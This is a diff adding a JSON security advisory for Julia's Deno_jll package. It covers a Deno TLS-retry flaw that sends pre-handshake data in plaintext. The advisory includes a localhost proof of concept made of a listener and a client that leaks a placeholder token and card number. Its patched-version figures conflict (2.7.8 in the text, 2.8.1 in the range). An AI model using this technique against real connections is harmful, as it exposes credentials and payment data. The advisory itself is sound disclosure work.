@@ -1,0 +1,92 @@
+{
+    "schema_version": "1.7.4",
+    "id": "JLSEC-2026-654",
+    "modified": "2026-07-07T13:43:33.746Z",
+    "published": "2026-07-07T13:43:33.746Z",
+    "upstream": [
+        "CVE-2026-44726",
+        "GHSA-chqv-56wv-7564",
+        "EUVD-2026-38548"
+    ],
+    "summary": "Deno's TLS retry copies stale upgrade hook, risking plaintext traffic",
+    "details": "## Summary\n\nA flaw in Deno's Node.js tls compatibility layer could cause a TLS client to transmit application data in plaintext after a connection retry. When `autoSelectFamily was enabled and the first address-family attempt failed, the socket reinitialization path reused a stale TLS upgrade hook that was bound to the original, failed handle.\n\nAs a result, the replacement TCP connection was never upgraded to TLS, and any data the application wrote before the `secureConnect` event travelled over the network unencrypted.\n\nA network attacker positioned to cause the initial connection attempt to fail (for example, by dropping IPv6 traffic on a dual-stack host) could deterministically trigger the fallback path and observe or tamper with traffic that the application believed was TLS-protected.\n\n**Affected APIs**: Applications using Deno's `node:tls` or `node:https` surface with `autoSelectFamily` enabled (the default) that wrote to the socket before the `secureConnect` event.\n\n## Proof of concept\n\n`attacker.mjs` (captures whatever the client sends)\n\n```ts\nimport net from \"node:net\";\n\nconst server = net.createServer((socket) => {\n  console.log(\"[attacker] client connected from\", socket.remoteAddress);\n  socket.on(\"data\", (chunk) => {\n    // If TLS were working, this would be an opaque ClientHello.\n    // If the bug fires, we see the application payload in cleartext.\n    console.log(\"[attacker] received\", chunk.length, \"bytes:\");\n    console.log(chunk.toString(\"utf8\"));\n  });\n});\n\nserver.listen(4444, \"127.0.0.1\", () => {\n  console.log(\"[attacker] listening on 127.0.0.1:4444\");\n});\n```\n\n`victim.mjs` (a normal-looking TLS client)\n\n```ts\nimport tls from \"node:tls\";\n\nconst socket = tls.connect({\n  host: \"api.example.invalid\",\n  port: 4444,\n  autoSelectFamily: true, // Node-compat default\n\n  // First address is a black hole (nothing on [::1]:4444),\n  // so autoSelectFamily falls back to the second address.\n  // In a real attack, the on-path attacker arranges this via\n  // routing, DNS, or by dropping the first SYN.\n  lookup: (_host, _opts, cb) => {\n    cb(null, [\n      { address: \"::1\",       family: 6 }, // fails -> retry\n      { address: \"127.0.0.1\", family: 4 }, // attacker\n    ]);\n  },\n\n  rejectUnauthorized: false,\n});\n\n// Application writes BEFORE secureConnect — common pattern in\n// Node clients that pipe a request body or send a greeting.\nsocket.write(\"POST /v1/charge HTTP/1.1\\r\\n\");\nsocket.write(\"Authorization: Bearer sk_live_SECRET_TOKEN\\r\\n\");\nsocket.write(\"Content-Type: application/json\\r\\n\\r\\n\");\nsocket.write(JSON.stringify({ amount: 100, card: \"4242424242424242\" }));\n\nsocket.on(\"secureConnect\", () => console.log(\"[victim] secureConnect\"));\nsocket.on(\"error\",         (e) => console.log(\"[victim] error:\", e.message));\n```\n\nIn terminal 1 `deno run --allow-net attacker.mjs`\nIn terminal 2 `deno run --allow-net victim.mjs`\n\n### Expected vs. observed\n\nOn a patched Deno (≥ 2.7.8), the attacker terminal sees an opaque TLS ClientHello (a binary blob starting with `0x16 0x03 0x01 …`), and the victim eventually errors out because the attacker isn't speaking TLS.\n\nOn a vulnerable Deno (≥ 2.0.0, < 2.7.8), the attacker terminal prints:\n\n```\n[attacker] received 41 bytes:\nPOST /v1/charge HTTP/1.1\nAuthorization: Bearer sk_live_SECRET_TOKEN\n...\n```\n\nThe bearer token, the request body, and the card number all appear in plaintext, even though the application used\n`tls.connect`.",
+    "severity": [
+        {
+            "type": "CVSS_V3",
+            "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N"
+        }
+    ],
+    "affected": [
+        {
+            "ranges": [
+                {
+                    "type": "SEMVER",
+                    "events": [
+                        {
+                            "introduced": "2.0.0+0"
+                        },
+                        {
+                            "fixed": "2.8.1+0"
+                        }
+                    ]
+                }
+            ],
+            "package": {
+                "ecosystem": "Julia",
+                "name": "Deno_jll",
+                "purl": "pkg:julia/Deno_jll?uuid=04572ae6-984a-583e-9378-9577a1c2574d"
+            }
+        }
+    ],
+    "references": [
+        {
+            "type": "WEB",
+            "url": "https://github.com/advisories/GHSA-chqv-56wv-7564"
+        },
+        {
+            "type": "WEB",
+            "url": "https://github.com/denoland/deno/security/advisories/GHSA-chqv-56wv-7564"
+        }
+    ],
+    "credits": [
+        {
+            "name": "r3wretrhy",
+            "contact": [
+                "https://github.com/r3wretrhy"
+            ],
+            "type": "REPORTER"
+        }
+    ],
+    "database_specific": {
+        "license": "CC-BY-4.0",
+        "sources": [
+            {
+                "id": "CVE-2026-44726",
+                "imported": "2026-06-27T08:36:01.287Z",
+                "modified": "2026-06-26T18:11:01.950Z",
+                "published": "2026-06-23T18:17:48.623Z",
+                "url": "https://services.nvd.nist.gov/rest/json/cves/2.0?cveId=CVE-2026-44726",
+                "html_url": "https://nvd.nist.gov/vuln/detail/CVE-2026-44726",
+                "database_specific": {
+                    "status": "Analyzed"
+                }
+            },
+            {
+                "id": "GHSA-chqv-56wv-7564",
+                "imported": "2026-06-27T08:36:37.247Z",
+                "modified": "2026-05-27T19:51:46Z",
+                "published": "2026-05-27T19:51:46Z",
+                "url": "https://api.github.com/advisories/GHSA-chqv-56wv-7564",
+                "html_url": "https://github.com/advisories/GHSA-chqv-56wv-7564"
+            },
+            {
+                "id": "EUVD-2026-38548",
+                "imported": "2026-06-27T08:36:01.407Z",
+                "modified": "2026-06-25T13:48:50Z",
+                "published": "2026-06-23T17:24:02Z",
+                "url": "https://euvdservices.enisa.europa.eu/api/enisaid?id=EUVD-2026-38548",
+                "html_url": "https://euvd.enisa.europa.eu/vulnerability/EUVD-2026-38548"
+            }
+        ]
+    }
+}
